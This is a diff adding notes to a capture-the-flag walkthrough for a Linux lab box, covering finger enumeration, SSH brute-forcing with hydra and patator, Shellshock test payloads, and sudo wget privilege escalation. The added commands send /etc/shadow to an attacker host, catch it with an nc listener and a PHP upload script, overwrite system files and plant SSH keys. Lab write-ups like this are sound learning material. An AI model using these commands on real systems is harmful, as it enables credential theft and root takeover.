@@ -290,11 +290,17 @@ vncviewer 127.0.0.1::6901
 - run nmap scans
 - after finding out finger is installed, use msfconsole or finger-enum to enumerate the users
 - after running the perl you must be able guess the right users
+- try cracking the user 'sunny' password with hydra or patator
+- once logged in either enumerate or start looking for sudo permissions or suid files
+- export the /backup directory & you may find password hash
+- use one of the hash cracking tools to get the password & login as sammy user
+- look at his `sudo -l` and wget can be used for privesc (take a look at GTFObins)
 
 ### Lessons Learnt
 
 - finger tells you what users are logged into the system, you can do some cool enumeration on the system
 - two programs to enumerate metasploit, one is metasploit `msfdb run` and two is `finger enum github`
+- if the linux OS is dated back to 2008, it may be vulnerable to shell shock
 
 ### Commands Used
 
@@ -319,7 +325,51 @@ hydra -l sunny -p sunday ssh://10.10.10.76:220222
 # you can try another tool called patator
 patator ssh_login host=10.10.10.76 port=22022 user=sunny password=FILE0 0=/usr/share/SecLists/Passwords/Probable-v2-top2575.txt persistent=0 -x ignore:mesg='Authentication failed'
 
+# if you just want to do it with a single word, use fgrep, -x  ignore:fgrep='failed'
+
 # go to /usr/share/SecLists/Passwords & pick a file whose wc is 1000 lines or fewer
 find . -type f -exec wc -l {} \; | sort -nr 
 
+# shell shock payload
+bluejay820='() { :;}; echo PleaseSubscribe' bash -c :
+bluejay820='echo PleaseSubscribe' base -c :
+
+# vulnerable to shell shock through sudo
+LOGNAME='() { :;}; echo PleaseSubscribe' sudo /root/troll
+
+# priv-esc-1
+sudo wget -i /etc/shadow 2>&1 | awk '{print $1}' 
+sudo wget http://<attacker-ip>/troll -O /root/troll
+
+<< troll >>
+#!/usr/bin/bash
+bash
+<< troll >>
+
+# priv-esc-2
+sudo wget --post-file=/etc/shadow <attacker-ip>
+
+on attacker-box
+nc -lnvp 80 > /etc/shadow
+
+# priv-esc-3
+sudo wget --post-file=/etc/shadow  <attacker-ip>/upload.php?file=shadow
+
+<< upload.php >>
+<?php
+fname=basename($_REQUEST['filename']);
+file_put_contents('upload/' . $fname, file_get_contents('php://input'));
+?>
+
+umask 555 (difference from 777 is 222 that is what permissions the file will get)
+php -S <attacker-ip>:8001 -t .
+
+sudo wget 10.10.14.2:8001/shadow -O /etc/shadow
+
+# priv-esc-4
+generate an ssh-key & rename id_rsa.pub to be authorized_keys
+
+# it will recursively get all the files and drops them in /root
+sudo wget -P -nH /root/ -m <attacker-ip>:8000
+ 
 ```
